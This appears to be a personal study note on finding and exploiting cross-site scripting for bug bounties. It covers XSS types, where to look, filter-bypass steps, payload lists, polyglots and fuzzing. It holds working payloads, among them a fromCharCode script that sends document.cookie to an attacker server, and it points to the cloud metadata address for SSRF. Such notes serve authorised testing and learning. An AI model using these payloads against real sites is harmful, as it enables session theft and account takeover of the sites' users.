> [!NOTE] note that
> - no clear cut to pass WAF, figuring out what works and doesn’t [Awesome-WAF](https://github.com/0xInfection/Awesome-WAF),[XSS-Filter-Bypass-Cheat-Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet) [[Bypass WAF]]
> - finding XSS mean that this site’s security is bad so we can find more [meta-data](http://169.254.169.254/latest/meta-data) [[SSRF]]
> - if u can't then try [[HTML injection]]
### Types and pref

#### Reflected XSS
> Reflected XSS vulnerabilities happen when user input is returned to the user without being stored in a database. The application takes in user input, processes it server-side, and immediately returns it to the user
#### Stored XSS
> when user input is stored on a server and retrieved unsafely
##### blind XSS 
> Blind XSS vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server and executed in another part of the application or in another application that you cannot see. These XSS flaws are harder to detect, since you can’t find them by looking for reflected input Often, blind XSS can be used to attack administrators.
 
> use payload from [xsshunter](https://xsshunter.com/features) ,or [knoxss.me](http://knoxss.me/), monitor logs and wait :)
#### DOM XSS
> DOM-based XSS is similar to reflected XSS, except that in DOM-based XSS, the user input never leaves the user’s browser. In DOM-based XSS, the application takes in user input, processes it on the victim’s browser, and then returns it to the user.
> 	 - JavaScript libraries like **jQuery** are prone to DOM-based XSS
> 	 - when ever u see **URL fragments**
##### Self-XSS
> Self-XSS attacks require victims to input a malicious payload themselves. To perform these, attackers must trick users into doing much more than simply viewing a page or browsing to a particular URL.
> 	In bug bounties, self-XSS bugs are not usually accepted as valid submissions because they require social engineering
> 	to get high impact use it with other vuln: [uber-turning-self-xss-into-good-xss](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/)

### where to find
1. test every parameter that reflected in the page, even drop down values, and multi select
2. inject 'devMRT' then use [Ctrl+f] to find where string get reflected
3. >'<"//:=;!--. Take note of which ones the application escapes and which get rendered directly
4. for DOM:
	> figure out where user input (source such `document.*`, and `location.*`) is being used in the application. If the source is being paced to a dangerous sink you could have XSS.
1. common endpoints:
	1. forms, search boxes, and name and username fields in sign-ups.
	2. "/upload_profile_pic?url=IMAGE_URL" => `data:text/html,<scrip...`
2. common parameters: 
	1. "q", "s", "search", "id", "lang", "keyword", "query", "page", "keywords", "year", "view", "email", "type", "name", "p", "month", "image", "list_type", "url", "terms", "categoryid", "key", "l", "begindate", "enddate"
> after send the payload be sure to view the page source and confirm whether your payloads are being rendered in HTML or JavaScript tags.

> for stored XSS make sure u visit each location your payload rendered at 

> When sites sanitize user input by modifying it instead of encoding or escaping values, you should continue testing the site’s server-side logic. start asking "what if" and let the site answer

> try to find alternative input method for XSS payload like JSON
> remember to use iframe with `src=javascript:alert(document.domain)`
### Process for testing for XSS & filtering:
1. find if there are any allowed tags <img>, `<h1>` ,`<table>`, `<u>`. 
2. reflected in encoding format then try:  `&it;` or `%3C`,or double encoding `%253C` and `%26lt;` [more encoding](https://d3adend.org/xss/ghettoBypass)
3. try to include script from out source: `<script src=//mysite.com?c=`
4. or add some encoded chars: `<%00iframe`, `on%0derror` `<%00h2` , `%0d`, `%0a`, `%09`
5. `string.fromCharCode()` ex
	```js
	<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT> => "http://attacker_server_ip/?c="
   ```
   use on of following to get ascii code for your payload:
   1. https://js.do/
   2.  js code
	```js
	<script>
		function ascii(c){ return c.charCodeAt(); }
		encoded = "INPUT_STRING".split("").map(ascii);
		document.write(encoded);
	</script>
	```
[OWASP’s XSS filter evasion cheat sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
###### stop if: not matter what you try you always see `&lt;script&gt;` or `%3Cscript%3E`

### payloads
`</script/x>`, `<ScRipt>` 
no space⇒ `<svg/onload=alert()>` 
`<iframe src="<http://colabrator>">`,`<iframe src=javascript:alert(1)>`
`"><img img src=x onerror=prompt(1);>`
`<a onmouseover"alert(1)">test</a>`
<svg/onload=prompt{`document.cookie`}> 
also u can use **_the optional chaining operator_** `?.` :
	`alert?.('Hello, World!');`
	`const obj = { showAlert: alert }; obj.showAlert?.call(window, 'Hello, World!');`
	`const obj = { nested: { showAlert: alert } }; obj.nested?.showAlert?.call(window, 'Hello, World!');`
URLs: 
```urls
javascript%0a:\\u0061lert(origin)
javascript%0a:alert(origin)
java%0d%0ascript%0d%0a:alert(0)
j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0`
java%09scrip%07t:prompt`0` jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`
data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+
data:text/html,<script>alert(0)</script>
<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>`
<inpuT autofocus oNFocus="setTimeout(function){/*\*/top['al'+\u0065'+'rt'](1)/*\*/}，5000);"></inpuT%3E；
<Img+Src=javascript:alert(1)+OnError=location=src>
```

###### XSS polyglot
> a type of XSS payload that executes in multiple contexts. it will execute XSS regardless of whether it is inserted into an `<img>` `<script>` , `<a>` or `<p>`
> https://polyglot.innerht.ml/: 
```js
javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//<stYle/<tiTle/</teXtarEa/</ScRiPt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
### fuzzing
> automatically test a site for already-known XSS vectors is through fuzzing
``` js
GET /search?q=FUZZ 
Host: example.com 

POST /send_email 
Host: example.com
..........
user_id=abc&title=FUZZ&body=FUZZ
```
use payload lists:
[portswigger cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/)
[Payload Box XSS payload list](https://github.com/payloadbox/ xss-payload-list)
Wfuzz wordlist
[NetSec.expert XSS payloads](https://netsec.expert/posts/xss-in-2020)

> [!NOTE] Title
> In some situations, the URL won’t match the origin. For example, about:blank and javascript: schemes inherit the origin of the document opening them. The about:blank context accesses information from or interacts with the browser, whereas javascript: executes JavaScript. The URL doesn’t provide information about its origin, so browsers handle these two contexts differently. When you find an XSS vulnerability, using alert(document.domain) in your proof of concept is helpful: it confirms the origin where the XSS executes, especially when the URL shown in the browser is different from the origin the XSS executes against. This is exactly what happens when a website opens a javascript: URL. If www..com opened a javascript:alert(document.domain) URL, the browser address would show javascript:alert(document.domain). But the alert box would show www..com because the alert inherits the origin of the previous document.

more at: file:///F:/Courses/02-cyber%20security/4-%20offensive%20security/PDFs/Offensive%20Security%20AWAE%20WEB-300%20OSWE.pdf page:344

### XSS Auditors
Browsers, try to prevent reflect and stored XSS by introducing *XSS Auditors*, here's how to bypass 
- [Browser's-XSS-Filter-Bypass-Cheat-Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
- https://blog.innerht.ml/the-misunderstood-x-xss-protection/
- https://hahwul.com/cullinan/xss/




file:///F:/Courses/02-cyber%20security/6-%20bug%20bounty/BugBountyBooks/Real-World%20Bug%20Hunting%20-%20A%20Field%20Guide%20to%20Web%20Hacking%20by%20Peter%20Yaworski.pdf => 108 
### tools
XSStrick  , Axiom

#### fresh writeups
skii.dev/rook-to-xss/ 
